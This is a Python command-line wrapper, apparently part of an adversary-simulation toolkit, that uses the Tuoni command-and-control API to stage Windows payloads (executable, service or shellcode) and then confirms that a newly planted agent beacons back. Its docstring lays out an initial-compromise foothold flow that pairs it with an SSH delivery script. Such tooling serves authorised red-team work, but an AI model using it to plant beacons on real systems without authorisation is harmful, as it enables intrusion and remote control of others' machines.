#!/usr/bin/env python3
"""Initial compromise — the Tuoni-API half of a foothold. Talks ONLY to the Tuoni
API, never SSH; delivery is `deliver.py`'s job, so the SSH recipe lives in one place.

Modes:
  prep (default)  select a listener (--listener-id or index 0) + a payload (--payload-id, or the
                  ACTIVE one of --payload-template/--payload-type, created if missing),
                  wait until ACTIVE, print the payload id, staged host/port, and
                  active-agent guids (so --verify can spot a fresh beacon).
  --verify        after deliver.py spawns the agent, wait for the new agent to
                  beacon and confirm with whoami. The ONLY step that decides the
                  agent is alive — deliver.py's "process running" is not that.

Foothold flow (skill drives all three; each script stays single-host):
  1. manage.py                                   # prep   -> PAYLOAD_ID + deliver cmd
  2. deliver.py --payload-id <id> ...             # SSH spawn -> pid
  3. manage.py --verify --pid <pid>              # prove the callback

Every input is an argparse flag with an env-var default (see --help).

Importable from a notebook: tuoni_prep()/tuoni_verify() take the same inputs as
the matching flags as keyword arguments and return a dict instead of only
printing. They raise TuoniScriptError on failure — argparse and sys.exit
live only in main(); the core logic is in adsim.
"""
import argparse
import os
import sys

from adsim.tuoni.common import TuoniScriptError
from adsim.tuoni.manage import (
    tuoni_prep,
    tuoni_verify,
)


def parse_args():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--api", default=os.environ.get("TUONI_API"),
                    help="Tuoni API base https://host:8443 (default: env TUONI_API)")
    ap.add_argument("--user", default=os.environ.get("TUONI_USER"),
                    help="Tuoni API user (default: env TUONI_USER)")
    ap.add_argument("--password", default=os.environ.get("TUONI_PASS"),
                    help="Tuoni API password (default: env TUONI_PASS)")
    ap.add_argument("--tuoni-host", default=os.environ.get("TUONI_HOST"),
                    help="Callback host override (default: env TUONI_HOST or API hostname)")
    ap.add_argument("--listener-id", type=int,
                    default=(int(os.environ["LISTENER_ID"]) if os.environ.get("LISTENER_ID") else None),
                    help="Listener id to use; omit to use index 0 (default: env LISTENER_ID)")
    ap.add_argument("--payload-id", type=int,
                    default=(int(os.environ["PAYLOAD_ID"]) if os.environ.get("PAYLOAD_ID") else None),
                    help="[prep] reuse this payload id instead of resolving one (default: env PAYLOAD_ID)")
    ap.add_argument("--payload-template", default="shelldot.payload.windows-x64",
                    help="[prep] payload template to reuse or create (default: shelldot.payload.windows-x64)")
    ap.add_argument("--payload-type", default="EXECUTABLE",
                    help="[prep] payload type to reuse or create: EXECUTABLE, SERVICE, SHELLCODE (default: EXECUTABLE)")
    ap.add_argument("--verify", action="store_true",
                    help="verify a beacon after delivery (instead of prep)")
    ap.add_argument("--pid", type=int, default=(int(os.environ["PID"]) if os.environ.get("PID") else None),
                    help="[verify] pid deliver.py reported, for exact correlation (default: env PID)")
    ap.add_argument("--known", default=os.environ.get("KNOWN_GUIDS", ""),
                    help="[verify] comma-separated guids active before delivery (prep prints these); "
                         "a new beacon is one not in this set (default: env KNOWN_GUIDS)")
    ap.add_argument("--max-wait", type=int, default=int(os.environ.get("MAX_WAIT", "120")),
                    help="[verify] seconds to wait for the beacon (default: env MAX_WAIT or 120)")
    ap.add_argument("--target-ip", default=os.environ.get("TARGET_IP"),
                    help="[prep] Windows target, only to print the deliver.py hint (default: env TARGET_IP)")
    ap.add_argument("--exec-user", default=os.environ.get("EXEC_USER"),
                    help="[prep] exec user, only to print the deliver.py hint (default: env EXEC_USER)")
    return ap.parse_args()


def main():
    args = parse_args()
    try:
        if not args.api:
            raise TuoniScriptError("--api not set (or env TUONI_API)")
        if not (args.user and args.password):
            raise TuoniScriptError(
                "--user and --password required (or env TUONI_USER/TUONI_PASS)")

        if args.verify:
            tuoni_verify(api=args.api, user=args.user, password=args.password,
                       pid=args.pid, known=args.known, max_wait=args.max_wait)
        else:
            tuoni_prep(api=args.api, user=args.user, password=args.password,
                     tuoni_host=args.tuoni_host, listener_id=args.listener_id,
                     payload_id=args.payload_id, target_ip=args.target_ip,
                     payload_template=args.payload_template, payload_type=args.payload_type,
                     exec_user=args.exec_user)
    except TuoniScriptError as e:
        sys.exit(str(e))


if __name__ == "__main__":
    main()
